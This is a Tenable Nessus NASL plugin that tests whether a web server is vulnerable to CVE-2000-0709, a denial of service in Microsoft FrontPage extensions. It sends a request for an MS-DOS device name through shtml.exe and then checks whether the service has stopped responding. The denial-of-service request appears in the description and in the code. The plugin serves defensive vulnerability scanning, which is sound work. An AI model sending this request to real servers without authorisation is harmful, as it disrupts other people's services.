#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10497);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-0709");
 script_bugtraq_id(1608);
 script_xref(name:"OSVDB", value:"3300");

 script_name(english:"Microsoft FrontPage Extensions MS-DOS Device Request DoS");
 script_summary(english:"Disables Microsoft Frontpage extensions");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The web server has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It is possible to disable FrontPage extensions on the remote host by\n",
     "requesting a URL containing the name of a DOS device via shtml.exe,\n",
     "such as :\n\n",
     "  GET /_vti_bin/shtml.exe/aux.htm\n\n",
     "An attacker could use this flaw to disable FrontPage."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-08/0288.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://msdn.microsoft.com/workshop/languages/fp/2000/winfpse.asp"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to FrontPage 1.2 or later."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"Web Servers");

 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);

if(get_port_state(port))
{
 r1 = http_send_recv3(method:"GET", item:"/_vti_bin/shtml.exe", port:port);
 if (isnull(r1)) exit(0);

 if (ereg(pattern:"HTTP/[0-9]\.[0-9] 200 .*", string:r1[2]))
 {
   r2 = http_send_recv3(
     method:"GET",
     item:"/_vti_bin/shtml.exe/aux.htm",
     port:port
   );
   r3 = http_send_recv3(method:"GET", item:"/_vti_bin/shtml.exe", port:port);

   if (isnull(r3)) security_warning(port);
 }
}
    
